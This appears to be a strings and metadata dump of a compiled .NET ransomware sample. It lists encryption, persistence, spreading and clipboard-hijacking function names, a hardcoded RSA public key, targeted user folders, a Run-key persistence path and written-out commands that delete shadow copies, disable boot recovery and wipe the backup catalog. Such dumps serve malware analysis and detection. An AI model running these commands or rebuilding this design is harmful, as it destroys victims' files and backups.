Metadata Signature: 0x1db0 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: ac4
Stream name: #~ 4
DirectoryAddress: b30 Size: e6c
Stream name: #Strings 12
DirectoryAddress: 199c Size: b0dc
Stream name: #US 4
DirectoryAddress: ca78 Size: 10
Stream name: #GUID 8
DirectoryAddress: ca88 Size: 35c
Stream name: #Blob 8
[Strings]
nth paddr      vaddr      len  size section type    string
83  0x000029d3 0x004047d3 16   17   .text   ascii   checkCopyRoaming
84  0x000029e4 0x004047e4 11   12   .text   ascii   processName
85  0x000029f0 0x004047f0 12   13   .text   ascii   appMutexRun2
86  0x000029fd 0x004047fd 18   19   .text   ascii   checkStartupFolder
87  0x00002a10 0x00404810 10   11   .text   ascii   checkSleep
88  0x00002a1b 0x0040481b 12   13   .text   ascii   sleepTextbox
89  0x00002a28 0x00404828 11   12   .text   ascii   base64Image
90  0x00002a34 0x00404834 15   16   .text   ascii   appMutexStartup
91  0x00002a44 0x00404844 21   22   .text   ascii   droppedMessageTextbox
92  0x00002a5a 0x0040485a 19   20   .text   ascii   checkAdminPrivilage
93  0x00002a6e 0x0040486e 23   24   .text   ascii   checkdeleteShadowCopies
94  0x00002a86 0x00404886 24   25   .text   ascii   checkdisableRecoveryMode
95  0x00002a9f 0x0040489f 24   25   .text   ascii   checkdeleteBackupCatalog
96  0x00002ab8 0x004048b8 16   17   .text   ascii   appMutexStartup2
97  0x00002ac9 0x004048c9 9    10   .text   ascii   appMutex2
98  0x00002ad3 0x004048d3 11   12   .text   ascii   staticSplit
99  0x00002adf 0x004048df 8    9    .text   ascii   appMutex
100 0x00002ae8 0x004048e8 30   31   .text   ascii   System.Text.RegularExpressions
101 0x00002b07 0x00404907 5    6    .text   ascii   Regex
102 0x00002b0d 0x0040490d 13   14   .text   ascii   appMutexRegex
103 0x00002b1b 0x0040491b 8    9    .text   ascii   messages
104 0x00002b24 0x00404924 15   16   .text   ascii   validExtensions
105 0x00002b34 0x00404934 20   21   .text   ascii   SystemParametersInfo
106 0x00002b49 0x00404949 4    5    .text   ascii   Main
107 0x00002b52 0x00404952 20   21   .text   ascii   sleepOutOfTempFolder
108 0x00002b67 0x00404967 14   15   .text   ascii   AlreadyRunning
109 0x00002b76 0x00404976 12   13   .text   ascii   random_bytes
110 0x00002b83 0x00404983 6    7    .text   ascii   Random
111 0x00002b8a 0x0040498a 6    7    .text   ascii   random
112 0x00002b91 0x00404991 12   13   .text   ascii   RandomString
113 0x00002b9e 0x0040499e 24   25   .text   ascii   RandomStringForExtension
114 0x00002bb7 0x004049b7 18   19   .text   ascii   Base64EncodeString
115 0x00002bca 0x004049ca 12   13   .text   ascii   randomEncode
116 0x00002bd7 0x004049d7 16   17   .text   ascii   encryptDirectory
117 0x00002be8 0x004049e8 6    7    .text   ascii   rsaKey
118 0x00002bef 0x004049ef 14   15   .text   ascii   CreatePassword
119 0x00002bfe 0x004049fe 11   12   .text   ascii   AES_Encrypt
120 0x00002c0a 0x00404a0a 11   12   .text   ascii   EncryptFile
121 0x00002c16 0x00404a16 10   11   .text   ascii   RSAEncrypt
122 0x00002c21 0x00404a21 18   19   .text   ascii   lookForDirectories
123 0x00002c34 0x00404a34 11   12   .text   ascii   copyRoaming
124 0x00002c40 0x00404a40 18   19   .text   ascii   copyResistForAdmin
125 0x00002c53 0x00404a53 16   17   .text   ascii   addLinkToStartup
126 0x00002c64 0x00404a64 14   15   .text   ascii   addAndOpenNote
127 0x00002c73 0x00404a73 15   16   .text   ascii   registryStartup
128 0x00002c83 0x00404a83 8    9    .text   ascii   spreadIt
129 0x00002c8c 0x00404a8c 10   11   .text   ascii   runCommand
130 0x00002c97 0x00404a97 18   19   .text   ascii   deleteShadowCopies
131 0x00002caa 0x00404aaa 19   20   .text   ascii   disableRecoveryMode
132 0x00002cbe 0x00404abe 19   20   .text   ascii   deleteBackupCatalog
133 0x00002cd2 0x00404ad2 12   13   .text   ascii   SetWallpaper
134 0x00002cdf 0x00404adf 5    6    .text   ascii   .ctor
135 0x00002ce9 0x00404ae9 26   27   .text   ascii   AddClipboardFormatListener
136 0x00002d04 0x00404b04 9    10   .text   ascii   SetParent
137 0x00002d0e 0x00404b0e 9    10   .text   ascii   intpreclp
138 0x00002d18 0x00404b18 16   17   .text   ascii   currentClipboard
139 0x00002d29 0x00404b29 11   12   .text   ascii   RegexResult
140 0x00002d35 0x00404b35 7    8    .text   ascii   Message
141 0x00002d3d 0x00404b3d 7    8    .text   ascii   WndProc
142 0x00002d45 0x00404b45 12   13   .text   ascii   CreateParams
143 0x00002d52 0x00404b52 16   17   .text   ascii   get_CreateParams
144 0x00002d63 0x00404b63 7    8    .text   ascii   GetText
145 0x00002d6b 0x00404b6b 7    8    .text   ascii   SetText
146 0x00002d73 0x00404b73 6    7    .text   ascii   action
147 0x00002d7a 0x00404b7a 6    7    .text   ascii   uParam
148 0x00002d81 0x00404b81 6    7    .text   ascii   vParam
149 0x00002d88 0x00404b88 6    7    .text   ascii   winIni
150 0x00002d8f 0x00404b8f 4    5    .text   ascii   args
151 0x00002d94 0x00404b94 6    7    .text   ascii   length
152 0x00002d9b 0x00404b9b 9    10   .text   ascii   plainText
153 0x00002da5 0x00404ba5 8    9    .text   ascii   location
154 0x00002dae 0x00404bae 18   19   .text   ascii   bytesToBeEncrypted
155 0x00002dc1 0x00404bc1 13   14   .text   ascii   passwordBytes
156 0x00002dcf 0x00404bcf 4    5    .text   ascii   file
157 0x00002dd4 0x00404bd4 13   14   .text   ascii   textToEncrypt
158 0x00002de2 0x00404be2 15   16   .text   ascii   publicKeyString
159 0x00002df2 0x00404bf2 8    9    .text   ascii   commands
160 0x00002dfb 0x00404bfb 6    7    .text   ascii   base64
161 0x00002e02 0x00404c02 30   31   .text   ascii   System.Runtime.InteropServices
162 0x00002e21 0x00404c21 18   19   .text   ascii   MarshalAsAttribute
163 0x00002e34 0x00404c34 13   14   .text   ascii   UnmanagedType
164 0x00002e42 0x00404c42 4    5    .text   ascii   hwnd
165 0x00002e47 0x00404c47 9    10   .text   ascii   hWndChild
166 0x00002e51 0x00404c51 13   14   .text   ascii   hWndNewParent
167 0x00002e5f 0x00404c5f 7    8    .text   ascii   pattern
168 0x00002e6d 0x00404c6d 31   32   .text   ascii   System.Runtime.CompilerServices
169 0x00002e8d 0x00404c8d 31   32   .text   ascii   CompilationRelaxationsAttribute
170 0x00002ead 0x00404cad 29   30   .text   ascii   RuntimeCompatibilityAttribute
171 0x00002ecb 0x00404ccb 10   11   .text   ascii   Ransomware
172 0x00002ed6 0x00404cd6 18   19   .text   ascii   DllImportAttribute
173 0x00002ee9 0x00404ce9 10   11   .text   ascii   user32.dll
174 0x00002ef4 0x00404cf4 10   11   .text   ascii   <Main>b__0
175 0x00002eff 0x00404cff 16   17   .text   ascii   System.Threading
176 0x00002f10 0x00404d10 11   12   .text   ascii   ThreadStart
177 0x00002f1c 0x00404d1c 38   39   .text   ascii   CS$<>9__CachedAnonymousMethodDelegate1
178 0x00002f43 0x00404d43 26   27   .text   ascii   CompilerGeneratedAttribute
179 0x00002f5e 0x00404d5e 11   12   .text   ascii   Environment
180 0x00002f6a 0x00404d6a 4    5    .text   ascii   Exit
181 0x00002f6f 0x00404d6f 6    7    .text   ascii   Thread
182 0x00002f76 0x00404d76 5    6    .text   ascii   Start
183 0x00002f7c 0x00404d7c 11   12   .text   ascii   Application
184 0x00002f88 0x00404d88 17   18   .text   ascii   System.Reflection
185 0x00002f9a 0x00404d9a 8    9    .text   ascii   Assembly
186 0x00002fa3 0x00404da3 16   17   .text   ascii   GetEntryAssembly
187 0x00002fb4 0x00404db4 12   13   .text   ascii   get_Location
188 0x00002fc1 0x00404dc1 9    10   .text   ascii   System.IO
189 0x00002fcb 0x00404dcb 4    5    .text   ascii   Path
190 0x00002fd0 0x00404dd0 16   17   .text   ascii   GetDirectoryName
191 0x00002fe1 0x00404de1 13   14   .text   ascii   SpecialFolder
192 0x00002fef 0x00404def 13   14   .text   ascii   GetFolderPath
193 0x00002ffd 0x00404dfd 6    7    .text   ascii   String
194 0x00003004 0x00404e04 13   14   .text   ascii   op_Inequality
195 0x00003012 0x00404e12 5    6    .text   ascii   Sleep
196 0x00003018 0x00404e18 18   19   .text   ascii   System.Diagnostics
197 0x0000302b 0x00404e2b 7    8    .text   ascii   Process
198 0x00003033 0x00404e33 12   13   .text   ascii   GetProcesses
199 0x00003040 0x00404e40 17   18   .text   ascii   GetCurrentProcess
200 0x00003052 0x00404e52 23   24   .text   ascii   ProcessModuleCollection
201 0x0000306a 0x00404e6a 11   12   .text   ascii   get_Modules
202 0x00003076 0x00404e76 13   14   .text   ascii   ProcessModule
203 0x00003084 0x00404e84 8    9    .text   ascii   get_Item
204 0x0000308d 0x00404e8d 12   13   .text   ascii   get_FileName
205 0x0000309a 0x00404e9a 20   21   .text   ascii   GetExecutingAssembly
206 0x000030af 0x00404eaf 11   12   .text   ascii   op_Equality
207 0x000030bb 0x00404ebb 6    7    .text   ascii   get_Id
208 0x000030c2 0x00404ec2 9    10   .text   ascii   Exception
209 0x000030cc 0x00404ecc 4    5    .text   ascii   Byte
210 0x000030d1 0x00404ed1 9    10   .text   ascii   NextBytes
211 0x000030db 0x00404edb 11   12   .text   ascii   System.Text
212 0x000030e7 0x00404ee7 13   14   .text   ascii   StringBuilder
213 0x000030f5 0x00404ef5 10   11   .text   ascii   get_Length
214 0x00003100 0x00404f00 4    5    .text   ascii   Next
215 0x00003105 0x00404f05 9    10   .text   ascii   get_Chars
216 0x0000310f 0x00404f0f 6    7    .text   ascii   Append
217 0x00003116 0x00404f16 8    9    .text   ascii   ToString
218 0x0000311f 0x00404f1f 8    9    .text   ascii   Encoding
219 0x00003128 0x00404f28 8    9    .text   ascii   get_UTF8
220 0x00003131 0x00404f31 8    9    .text   ascii   GetBytes
221 0x0000313a 0x00404f3a 7    8    .text   ascii   Convert
222 0x00003142 0x00404f42 14   15   .text   ascii   ToBase64String
223 0x00003151 0x00404f51 6    7    .text   ascii   Concat
224 0x00003158 0x00404f58 18   19   .text   ascii   <>c__DisplayClass3
225 0x0000316b 0x00404f6b 9    10   .text   ascii   extension
226 0x00003175 0x00404f75 22   23   .text   ascii   <encryptDirectory>b__2
227 0x0000318e 0x00404f8e 7    8    .text   ascii   ToLower
228 0x00003196 0x00404f96 9    10   .text   ascii   Directory
229 0x000031a0 0x00404fa0 8    9    .text   ascii   GetFiles
230 0x000031a9 0x00404fa9 12   13   .text   ascii   GetExtension
231 0x000031b6 0x00404fb6 11   12   .text   ascii   GetFileName
232 0x000031c2 0x00404fc2 11   12   .text   ascii   Predicate`1
233 0x000031ce 0x00404fce 5    6    .text   ascii   Array
234 0x000031d4 0x00404fd4 6    7    .text   ascii   Exists
235 0x000031db 0x00404fdb 8    9    .text   ascii   FileInfo
236 0x000031e4 0x00404fe4 14   15   .text   ascii   FileSystemInfo
237 0x000031f3 0x00404ff3 14   15   .text   ascii   FileAttributes
238 0x00003202 0x00405002 14   15   .text   ascii   set_Attributes
239 0x00003211 0x00405011 9    10   .text   ascii   GetString
240 0x0000321b 0x0040501b 4    5    .text   ascii   File
241 0x00003220 0x00405020 12   13   .text   ascii   WriteAllText
242 0x0000322d 0x0040502d 4    5    .text   ascii   Move
243 0x00003232 0x00405032 7    8    .text   ascii   ToInt32
244 0x0000323a 0x0040503a 13   14   .text   ascii   WriteAllLines
245 0x00003248 0x00405048 14   15   .text   ascii   GetDirectories
246 0x00003257 0x00405057 10   11   .text   ascii   AppendLine
247 0x00003262 0x00405062 68   69   .text   ascii   <PrivateImplementationDetails>{85CD0D0A-6D3D-4975-9A00-2081AB9E809E}
248 0x000032a7 0x004050a7 19   20   .text   ascii   $$method0x600000e-1
249 0x000032bb 0x004050bb 14   15   .text   ascii   RuntimeHelpers
250 0x000032ca 0x004050ca 18   19   .text   ascii   RuntimeFieldHandle
251 0x000032dd 0x004050dd 15   16   .text   ascii   InitializeArray
252 0x000032ed 0x004050ed 12   13   .text   ascii   MemoryStream
253 0x000032fa 0x004050fa 28   29   .text   ascii   System.Security.Cryptography
254 0x00003317 0x00405117 15   16   .text   ascii   RijndaelManaged
255 0x00003327 0x00405127 18   19   .text   ascii   SymmetricAlgorithm
256 0x0000333a 0x0040513a 11   12   .text   ascii   set_KeySize
257 0x00003346 0x00405146 13   14   .text   ascii   set_BlockSize
258 0x00003354 0x00405154 18   19   .text   ascii   Rfc2898DeriveBytes
259 0x00003367 0x00405167 11   12   .text   ascii   get_KeySize
260 0x00003373 0x00405173 11   12   .text   ascii   DeriveBytes
261 0x0000337f 0x0040517f 7    8    .text   ascii   set_Key
262 0x00003387 0x00405187 13   14   .text   ascii   get_BlockSize
263 0x00003395 0x00405195 6    7    .text   ascii   set_IV
264 0x0000339c 0x0040519c 10   11   .text   ascii   CipherMode
265 0x000033a7 0x004051a7 8    9    .text   ascii   set_Mode
266 0x000033b0 0x004051b0 16   17   .text   ascii   ICryptoTransform
267 0x000033c1 0x004051c1 15   16   .text   ascii   CreateEncryptor
268 0x000033d1 0x004051d1 12   13   .text   ascii   CryptoStream
269 0x000033de 0x004051de 6    7    .text   ascii   Stream
270 0x000033e5 0x004051e5 16   17   .text   ascii   CryptoStreamMode
271 0x000033f6 0x004051f6 5    6    .text   ascii   Write
272 0x000033fc 0x004051fc 5    6    .text   ascii   Close
273 0x00003402 0x00405202 11   12   .text   ascii   IDisposable
274 0x0000340e 0x0040520e 7    8    .text   ascii   Dispose
275 0x00003416 0x00405216 7    8    .text   ascii   ToArray
276 0x0000341e 0x0040521e 12   13   .text   ascii   ReadAllBytes
277 0x0000342b 0x0040522b 24   25   .text   ascii   RSACryptoServiceProvider
278 0x00003444 0x00405244 19   20   .text   ascii   AsymmetricAlgorithm
279 0x00003458 0x00405258 13   14   .text   ascii   FromXmlString
280 0x00003466 0x00405266 7    8    .text   ascii   Encrypt
281 0x0000346e 0x0040526e 19   20   .text   ascii   set_PersistKeyInCsp
282 0x00003482 0x00405282 9    10   .text   ascii   DriveInfo
283 0x0000348c 0x0040528c 9    10   .text   ascii   GetDrives
284 0x00003496 0x00405296 9    10   .text   ascii   AppDomain
285 0x000034a0 0x004052a0 17   18   .text   ascii   get_CurrentDomain
286 0x000034b2 0x004052b2 16   17   .text   ascii   get_FriendlyName
287 0x000034c3 0x004052c3 4    5    .text   ascii   Copy
288 0x000034c8 0x004052c8 16   17   .text   ascii   ProcessStartInfo
289 0x000034d9 0x004052d9 20   21   .text   ascii   set_WorkingDirectory
290 0x000034ee 0x004052ee 13   14   .text   ascii   set_StartInfo
291 0x000034fc 0x004052fc 6    7    .text   ascii   Delete
292 0x00003503 0x00405303 19   20   .text   ascii   set_UseShellExecute
293 0x00003517 0x00405317 8    9    .text   ascii   set_Verb
294 0x00003520 0x00405320 18   19   .text   ascii   ProcessWindowStyle
295 0x00003533 0x00405333 15   16   .text   ascii   set_WindowStyle
296 0x00003543 0x00405343 21   22   .text   ascii   System.ComponentModel
297 0x00003559 0x00405359 14   15   .text   ascii   Win32Exception
298 0x00003568 0x00405368 19   20   .text   ascii   get_NativeErrorCode
299 0x0000357c 0x0040537c 15   16   .text   ascii   get_ProcessName
300 0x0000358c 0x0040538c 12   13   .text   ascii   StreamWriter
301 0x00003599 0x00405399 10   11   .text   ascii   TextWriter
302 0x000035a4 0x004053a4 9    10   .text   ascii   WriteLine
303 0x000035ae 0x004053ae 7    8    .text   ascii   Replace
304 0x000035b6 0x004053b6 15   16   .text   ascii   Microsoft.Win32
305 0x000035c6 0x004053c6 8    9    .text   ascii   Registry
306 0x000035cf 0x004053cf 11   12   .text   ascii   RegistryKey
307 0x000035db 0x004053db 11   12   .text   ascii   CurrentUser
308 0x000035e7 0x004053e7 10   11   .text   ascii   OpenSubKey
309 0x000035f2 0x004053f2 8    9    .text   ascii   SetValue
310 0x000035fb 0x004053fb 12   13   .text   ascii   set_FileName
311 0x00003608 0x00405408 13   14   .text   ascii   set_Arguments
312 0x00003616 0x00405416 11   12   .text   ascii   WaitForExit
313 0x00003622 0x00405422 11   12   .text   ascii   GetTempPath
314 0x0000362e 0x0040542e 16   17   .text   ascii   FromBase64String
315 0x0000363f 0x0040543f 13   14   .text   ascii   WriteAllBytes
316 0x0000364d 0x0040544d 6    7    .text   ascii   .cctor
317 0x00003654 0x00405454 12   13   .text   ascii   get_UserName
318 0x00003661 0x00405461 6    7    .text   ascii   IntPtr
319 0x00003668 0x00405468 7    8    .text   ascii   Control
320 0x00003670 0x00405470 10   11   .text   ascii   get_Handle
321 0x0000367b 0x0040547b 5    6    .text   ascii   Match
322 0x00003681 0x00405481 5    6    .text   ascii   Group
323 0x00003687 0x00405487 11   12   .text   ascii   get_Success
324 0x00003693 0x00405493 7    8    .text   ascii   get_Msg
325 0x0000369b 0x0040549b 10   11   .text   ascii   StartsWith
326 0x000036a6 0x004054a6 8    9    .text   ascii   Contains
327 0x000036af 0x004054af 11   12   .text   ascii   get_ExStyle
328 0x000036bb 0x004054bb 11   12   .text   ascii   set_ExStyle
329 0x000036c7 0x004054c7 18   19   .text   ascii   <>c__DisplayClass1
330 0x000036da 0x004054da 11   12   .text   ascii   ReturnValue
331 0x000036e6 0x004054e6 13   14   .text   ascii   <GetText>b__0
332 0x000036f4 0x004054f4 9    10   .text   ascii   Clipboard
333 0x000036fe 0x004054fe 5    6    .text   ascii   Empty
334 0x00003704 0x00405504 14   15   .text   ascii   ApartmentState
335 0x00003713 0x00405513 17   18   .text   ascii   SetApartmentState
336 0x00003725 0x00405525 4    5    .text   ascii   Join
337 0x0000372a 0x0040552a 18   19   .text   ascii   <>c__DisplayClass4
338 0x0000373d 0x0040553d 13   14   .text   ascii   <SetText>b__3
339 0x0000374e 0x0040554e 36   73   .text   utf16le abcdefghijklmnopqrstuvwxyz0123456789
340 0x0000379a 0x0040559a 13   27   .text   utf16le <EncyptedKey>
341 0x000037b6 0x004055b6 14   29   .text   utf16le <EncyptedKey> 
342 0x000037dc 0x004055dc 39   79   .text   utf16le <?xml version="1.0" encoding="utf-16"?>
343 0x0000382d 0x0040562d 114  229  .text   utf16le <RSAParameters xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
344 0x00003913 0x00405713 27   55   .text   utf16le   <Exponent>AQAB</Exponent>
345 0x0000394c 0x0040574c 193  387  .text   utf16le   <Modulus>pGPPu+UHGT7kqH6jc0eJbRC1keHrj+3UyhQjWlEkwoGOnGzeahwt+MPJ8esrDufM9Chm+Voc01uGJSXWESY7H/Mi0VH58fbUwBfWd46+pwEng5ljGyYv1b8xPAYTNlp4R//kxDRyDDNUfLbLpzqyZZfKTJVrFMK7roDnkAg/aC0=</Modulus>
346 0x00003ad0 0x004058d0 69   140  .text   utf16le </RSAParameters>耀憋戀挀搀攀昀最栀椀樀欀氀洀渀漀瀀焀爀猀琀甀瘀眀砀礀稀䄀䈀䌀䐀䔀䘀䜀䠀䤀䨀䬀䰀䴀一伀倀儀刀匀吀唀嘀圀堀夀娀 blocks=Basic Latin,CJK Unified Ideographs,CJK Unified Ideographs Extension A
347 0x00003b5d 0x0040595d 16   33   .text   utf16le 234567890*!=&?&/
348 0x00003b7f 0x0040597f 14   29   .text   utf16le <EncryptedKey>
349 0x00003ba5 0x004059a5 8    18   .text   utf16le \Desktop
350 0x00003bb7 0x004059b7 6    13   .text   utf16le \Links
351 0x00003bc5 0x004059c5 9    19   .text   utf16le \Contacts
352 0x00003bd9 0x004059d9 10   21   .text   utf16le \Documents
353 0x00003bef 0x004059ef 10   21   .text   utf16le \Downloads
354 0x00003c05 0x00405a05 9    20   .text   utf16le \Pictures
355 0x00003c19 0x00405a19 6    13   .text   utf16le \Music
356 0x00003c27 0x00405a27 9    19   .text   utf16le \OneDrive
357 0x00003c3b 0x00405a3b 12   25   .text   utf16le \Saved Games
358 0x00003c55 0x00405a55 10   21   .text   utf16le \Favorites
359 0x00003c6b 0x00405a6b 9    19   .text   utf16le \Searches
360 0x00003c7f 0x00405a7f 7    15   .text   utf16le \Videos
361 0x00003c93 0x00405a93 5    11   .text   utf16le runas
362 0x00003c9f 0x00405a9f 4    9    .text   utf16le .url
363 0x00003ca9 0x00405aa9 18   37   .text   utf16le [InternetShortcut]
364 0x00003ccf 0x00405acf 12   25   .text   utf16le URL=file:///
365 0x00003ce9 0x00405ae9 11   23   .text   utf16le IconIndex=0
366 0x00003d01 0x00405b01 9    19   .text   utf16le IconFile=
367 0x00003d15 0x00405b15 45   91   .text   utf16le SOFTWARE\Microsoft\Windows\CurrentVersion\Run
368 0x00003d71 0x00405b71 15   31   .text   utf16le Microsoft Store
369 0x00003d91 0x00405b91 7    15   .text   utf16le cmd.exe
370 0x00003da9 0x00405ba9 60   121  .text   utf16le vssadmin delete shadows /all /quiet & wmic shadowcopy delete
371 0x00003e24 0x00405c24 101  203  .text   utf16le bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no
372 0x00003ef0 0x00405cf0 29   59   .text   utf16le wbadmin delete catalog -quiet
373 0x00003f2c 0x00405d2c 4    9    .text   utf16le .jpg
374 0x00003f36 0x00405d36 9    19   .text   utf16le C:\Users\
375 0x00003f4a 0x00405d4a 21   43   .text   utf16le 7z459ajrk722yn8c5j4fg
376 0x00003f76 0x00405d76 12   25   .text   utf16le GoldenWolf42
377 0x00003f90 0x00405d90 12   25   .text   utf16le surprise.exe
378 0x00003faa 0x00405daa 11   24   .text   utf16le svchost.exe
